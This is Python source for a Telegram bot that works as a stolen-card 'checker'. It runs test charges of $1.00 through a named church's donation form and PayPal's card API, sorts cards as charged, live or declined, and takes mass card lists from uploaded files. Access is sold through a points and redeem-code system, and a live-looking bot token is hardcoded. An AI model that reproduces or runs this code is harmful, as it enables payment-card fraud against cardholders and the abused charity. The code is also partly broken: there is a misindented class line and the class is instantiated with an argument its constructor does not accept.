import os
import re
import time
import random
import string
import asyncio
import httpx
import requests, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from urllib.parse import urlparse
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '7834120140:AAFKg-uBhB6ZFpDQqf3imLqyX9X2E2qO_XE'

# ------------------- PayPal Gateway Class -------------------

                class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        url = 'https://rhapsody.christembassydallas.org'
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.url = domain
        self.inurl = path
        self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()

    def Key(self):
        he1 = {
            'upgrade-insecure-requests': '1',
            'user-agent': self.uu.random,
        }
        r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1, )
        self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Krs(self, ccx):
        ccx=ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        he2 = {
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        da1 = {
            'give-honeypot': '',
            'give-form-id-prefix': self.id_form1,
            'give-form-id': self.id_form2,
            'give-form-title': 'Make a One-off Donation',
            'give-current-url': f'https://{self.url}{self.inurl}',
            'give-form-url': f'https://{self.url}{self.inurl}',
            'give-form-minimum': self.donation,
            'give-form-maximum': '50000',
            'give-form-hash': self.nonec,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': self.donation,
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': self.donation,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'card_name': 'msms',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_gift_check_is_billing_address': 'no',
            'give_gift_aid_address_option': 'billing_address',
            'give_gift_aid_card_first_name': '',
            'give_gift_aid_card_last_name': '',
            'give_gift_aid_billing_country': 'GB',
            'give_gift_aid_card_address': '',
            'give_gift_aid_card_address_2': '',
            'give_gift_aid_card_city': '',
            'give_gift_aid_card_state': '',
            'give_gift_aid_card_zip': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        r2 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1, )
        da2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}',),
            'give-form-url': (None, f'https://{self.url}{self.inurl}',),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he3 = {
            'accept': '*/*',
            'content-type': da2.content_type,
            'user-agent': self.uu.random,
        }
        pa1 = {
            'action': 'give_paypal_commerce_create_order',
        }
        r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']
        he4 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {self.au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3, )
        da4=MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, self.donation),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, self.donation),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he5 = {
            'accept': '*/*',
            'content-type': da4.content_type,
            'user-agent': self.uu.random,
        }
        pa2 = {
            'action': 'give_paypal_commerce_approve_order',
            'order': r3,
        }
        r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )
        text = r5.text
        if 'true' in text or 'sucsess' in text:
            return 'CHARGE 1.00$'
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                result = r5.json()['data']['error']
                return result
            except:
                return "UNKNOWN_ERROR"


# ------------------- Users & Gates -------------------

ADMINS = [6843321125]  # الأدمن
GATES = ["https://rhapsody.christembassydallas.org"] # البوابات
USER_POINTS = {}  # {user_id: points}
BANNED_USERS = {}  # {user_id: True}
ALL_USERS = set()  # كل المستخدمين
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7

user_tasks = {}

# ------------------- Codes -------------------

CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"points": 100, "max_users":5, "used":0, "created":timestamp}}

# ------------------- BIN Lookup -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                if r.status_code != 200:
                    continue
                data = r.json()
                brand = data.get("scheme") or data.get("brand") or data.get("type")
                card_type = data.get("type") or data.get("card_type")
                bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
                country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
                if not bank:
                    bank = data.get("issuer") or data.get("bank_name")
                if not country:
                    country = data.get("country_name")
                if brand or bank or country:
                    return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
            except:
                continue
            await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------

async def check_card_api(card_full):
    last_response = "No gates available"
    for gate_url in GATES:
        try:
            paypal_checker = PayPal(gate_url)
            if not await asyncio.to_thread(paypal_checker.Key):
                last_response = f"Key Error on {gate_url}"
                continue
            result_raw = await asyncio.to_thread(paypal_checker.Krs, card_full)
            result = result_raw.lower()
            if "charge 1.00$" in result or "success" in result:
                return "approved", result_raw
            elif "insufficient_funds" in result:
                return "live", result_raw
            else:
                last_response = result_raw
        except Exception as e:
            last_response = f"Error on {gate_url}: {e}"
            continue
    
    if "charge 1.00$" in last_response.lower() or "success" in last_response.lower():
        return "approved", last_response
    elif "insufficient_funds" in last_response.lower():
        return "live", last_response
    else:
        return "declined", last_response

# ------------------- Format Response -------------------

async def format_response(card_full, status, response, taken, user_id, user_name="Unknown"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        status_text = "#Paypal_Cvv_Charged☠"
    elif status == "live":
        status_text = "#Live ✅"
    else:
        status_text = "#Declined ❌"
        
    points = "Infinity" if user_id in ADMINS else USER_POINTS.get(user_id, 0)
        
    return f"""{status_text} [/pp] ($1.00)
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐂𝐚𝐫𝐝: `{card_full}`
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken} 𝐒.
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐈𝐧𝐟𝐨: {info} ✅
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐏𝐨𝐢𝐧𝐭𝐬 𝐋𝐞𝐟𝐭: {points}
- - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝐓𝐢𝐦𝐞: {taken} 𝐒𝐞𝐜.
[⎇] 𝐑𝐞𝐪 𝐁𝐲: {user_name}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @wafa4048 - 🍀"""

# ------------------- Permissions -------------------

def can_user_check(user_id):
    if user_id in ADMINS:
        return True
    if BANNED_USERS.get(user_id):
        return False
    if USER_POINTS.get(user_id, 0) > 0:
        return True
    return False

def deduct_point(user_id):
    if user_id in ADMINS:
        return True
    if USER_POINTS.get(user_id, 0) > 0:
        USER_POINTS[user_id] -= 1
        return True
    return False

# ------------------- /pp -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id):
        await update.message.reply_text("❌ You don't have enough points. Contact Admin.")
        return
    
    if user_id not in ADMINS:
        now = time.time()
        last = last_check_time.get(user_id, 0)
        if now - last < ANTI_SPAM_SECONDS:
            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")
            return
        last_check_time[user_id] = now
        
    try:
        asyncio.create_task(process_pp(update, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return
    
    deduct_point(user_id)
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)
    user_name = update.effective_user.first_name
    text = await format_response(card_full, status, response, taken, user_id, user_name)
    await update.message.reply_text(text, parse_mode="Markdown")

# ------------------- /stop -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- /addgate -------------------

async def add_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/addgate https://example.com")
    
    new_gate = context.args[0]
    if not new_gate.startswith("http"):
        return await update.message.reply_text("❌ Invalid URL")
    
    msg = await update.message.reply_text("🔍 Testing Gate...")
    
    test_card = "4532015112830366|12|2027|123"
    start_time = time.time()
    
    paypal_checker = PayPal(new_gate)
    is_key_ok = await asyncio.to_thread(paypal_checker.Key)
    
    if not is_key_ok:
        return await msg.edit_text("❌ Failed to fetch keys from this URL. Gate NOT added.")
        
    response = await asyncio.to_thread(paypal_checker.Krs, test_card)
    taken = round(time.time() - start_time, 2)
    
    working_responses = ["ACCOUNT_CLOSED", "INVALID_ACCOUNT", "INSUFFICIENT_FUNDS", "DO_NOT_HONOR", "DECLINED", "CHARGE 1.00$", "SUCCESS"]
    is_working = any(res in response.upper() for res in working_responses)
    
    status_text = "working" if is_working else "bad"
    gate_status = "𝐆𝐚𝐭𝐞 𝐒𝐞𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲! ✅" if is_working else "𝐆𝐚𝐭𝐞 𝐒𝐞𝐭 𝐅𝐚𝐢𝐥𝐞𝐝! ❌"
    
    if is_working:
        GATES.append(new_gate)
    
    bin_info, bank, country = await get_bin_info("453201")
    
    report = f"""#Paypal_Cvv_Charged☠ [/pp] ($1.00)
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐂𝐚𝐫𝐝: `{test_card}`
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken} 𝐒.
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐈𝐧𝐟𝐨: {bin_info} ✅ {gate_status}
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] Domain: {paypal_checker.domain}
[ϟ] Form ID: {paypal_checker.id_form2}
- - - - - - - - - - - - - - - - - - - - - -
🧪 𝐆𝐚𝐭𝐞 𝐓𝐞𝐬𝐭:
[ϟ] Card: {test_card}
[ϟ] Response: {response}
[ϟ] Status: {status_text}
[ϟ] Time: {taken}s
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐔𝐬𝐞 /pp [card] 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐦𝐚𝐧𝐮𝐚𝐥𝐥𝐲
[ϟ] 𝐎𝐫 𝐬𝐞𝐧𝐝 𝐚 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐟𝐨𝐫 𝐦𝐚𝐬𝐬 𝐜𝐡𝐞𝐜𝐤
- - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
- - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝐓𝐢𝐦𝐞: {taken} 𝐒𝐞𝐜.
[⎇] 𝐑𝐞𝐪 𝐁𝐲: {update.effective_user.first_name}
- - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @wafa4048 - 🍀"""
    
    await msg.edit_text(report, parse_mode="Markdown")

# ------------------- /removegate -------------------

async def remove_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/removegate https://example.com")
    
    gate_to_remove = context.args[0]
    if gate_to_remove in GATES:
        GATES.remove(gate_to_remove)
        await update.message.reply_text(f"✅ Gate removed successfully.\nRemaining gates: {len(GATES)}")
    else:
        await update.message.reply_text("❌ Gate not found in list.")

# ------------------- File Handler -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id):
        await update.message.reply_text("❌ You don't have enough points. Contact Admin.")
        return
    if user_id not in ADMINS:
        if user_id in user_tasks and not user_tasks[user_id].done():
            await update.message.reply_text("❌ Wait until current file finishes")
            return
    try:
        task = asyncio.create_task(process_file(update, context))
        user_tasks[user_id] = task
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# ------------------- process_file -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    stop_users[user_id] = False
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        results_file_path = f"downloads/results_{file.file_id}.txt"
        approved = live = declined = 0
        panel_msg = await update.message.reply_text("Start Checking... 🔍")
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        async def process_line(line):
            nonlocal approved, live, declined
            try:
                if not deduct_point(user_id):
                    return "NO_POINTS"
                    
                match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
                if not match:
                    return
                card_full = match[0]
                start_time = time.time()
                status, response = await check_card_api(card_full)
                await asyncio.sleep(random.uniform(0, 1))
                taken = round(time.time() - start_time, 2)
                text = await format_response(card_full, status, response, taken, user_id, user_name)
                if status == "approved":
                    approved += 1
                    await update.message.reply_text(text, parse_mode="Markdown")
                elif status == "live":
                    live += 1
                    await update.message.reply_text(text, parse_mode="Markdown")
                else:
                    declined += 1
                
                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
                points = "Infinity" if user_id in ADMINS else USER_POINTS.get(user_id, 0)
                panel = f"""📊 Status 

✅ Charge: {approved} 💥
🟢 Live: {live} 💫
❌ Declined: {declined}
📂 Total: {approved + live + declined}
💰 Points Left: {points}

━━━━━━━━━━━━━━━
💳 Last Card: `{card_full}`
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}"""
                try:
                    await panel_msg.edit_text(panel, parse_mode="Markdown")
                except:
                    pass
                return text
            except Exception as e:
                print(f"Line Error: {e}")
                return None

        for line in lines:
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return
            try:
                res = await process_line(line)
                if res == "NO_POINTS":
                    await update.message.reply_text("❌ Points finished!")
                    break
            except Exception as e:
                print(f"Loop Error: {e}")
                continue

        with open(results_file_path, 'w', encoding='utf-8') as result_file:
            for line in lines:
                try:
                    r = await format_response(line.strip(), "N/A", "N/A", 0, user_id, user_name)
                    result_file.write(r + "\n\n")
                except:
                    continue
        await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ------------------- ERROR HANDLER -------------------

async def error_handler(update, context):
    print(f"Global Error: {context.error}")

# ------------------- /try -------------------

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=reply_text)
        await update.message.reply_text("✅ Sent")
    except:
        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")

# ------------------- /code -------------------

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Code usage limit reached")
    
    current_points = USER_POINTS.get(user_id, 0)
    USER_POINTS[user_id] = current_points + code_data["points"]
    code_data["used"] += 1
    await update.message.reply_text(f"✅ Code activated!\nYou received {code_data['points']} points.\nTotal: {USER_POINTS[user_id]}\nUsed {code_data['used']}/{code_data['max_users']}")

# ------------------- /wafa (Add Points) -------------------

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) < 2:
        return await update.message.reply_text("Usage:\n/wafa USER_ID POINTS\nOr to create code: /wafa code POINTS MAX_USERS")
    
    if context.args[0].lower() == "code":
        try:
            points = int(context.args[1])
            max_users = int(context.args[2])
            code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
            CODES[code] = {"points": points, "max_users": max_users, "used": 0, "created": time.time()}
            return await update.message.reply_text(f"✅ Created code:\n{code}\nPoints: {points}\nMax users: {max_users}")
        except:
            return await update.message.reply_text("❌ Invalid numbers")
            
    try:
        target_id = int(context.args[0])
        points = int(context.args[1])
        USER_POINTS[target_id] = USER_POINTS.get(target_id, 0) + points
        await update.message.reply_text(f"✅ Added {points} points to {target_id}.\nTotal: {USER_POINTS[target_id]}")
    except:
        await update.message.reply_text("❌ Invalid format. Use: /wafa USER_ID POINTS")

# ------------------- /removewafa (Deduct Points) -------------------

async def remove_wafa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) < 2:
        return await update.message.reply_text("Usage:\n/removewafa USER_ID POINTS")
    try:
        target_id = int(context.args[0])
        points = int(context.args[1])
        current = USER_POINTS.get(target_id, 0)
        USER_POINTS[target_id] = max(0, current - points)
        await update.message.reply_text(f"✅ Deducted {points} points from {target_id}.\nRemaining: {USER_POINTS[target_id]}")
    except:
        await update.message.reply_text("❌ Invalid format. Use: /removewafa USER_ID POINTS")

# ------------------- /show_users -------------------

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    msg = "📊 All Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "ADMIN" if uid in ADMINS else "USER"
        pts = USER_POINTS.get(uid, 0) if uid not in ADMINS else "Infinity"
        msg += f"{uid} - {status} - Points: {pts}\n"
    await update.message.reply_text(msg if msg else "No users yet")

# ------------------- Ban/Unban -------------------

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/ban_user USER_ID")
    uid = int(context.args[0])
    BANNED_USERS[uid] = True
    await update.message.reply_text(f"User {uid} banned ✅")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/unban_user USER_ID")
    uid = int(context.args[0])
    BANNED_USERS.pop(uid, None)
    await update.message.reply_text(f"User {uid} unbanned ✅")

# ------------------- /helpcmds -------------------

async def help_cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return
    help_text = """🛠 **Admin Commands:**

🔹 **Gates Management:**
/addgate [url] - Add & Test new gate
/removegate [url] - Remove gate

🔹 **Points Management:**
/wafa [user_id] [points] - Add points to user
/wafa code [points] [max_users] - Create redeem code
/removewafa [user_id] [points] - Deduct points from user

🔹 **User Management:**
/show_users - List all users & points
/ban_user [user_id] - Ban user
/unban_user [user_id] - Unban user
/try [user_id] [msg] - Send message to user

🔹 **General:**
/start - Start the bot
/pp [card] - Single check
/stop - Stop current file check
/code [code] - Redeem points code"""
    await update.message.reply_text(help_text, parse_mode="Markdown")

# ------------------- /start -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    await update.message.reply_text("Bot Ready ✅\nUse /pp to check cards.")

# ------------------- Run -------------------

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("addgate", add_gate))
    app.add_handler(CommandHandler("removegate", remove_gate))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("removewafa", remove_wafa))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("helpcmds", help_cmds))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
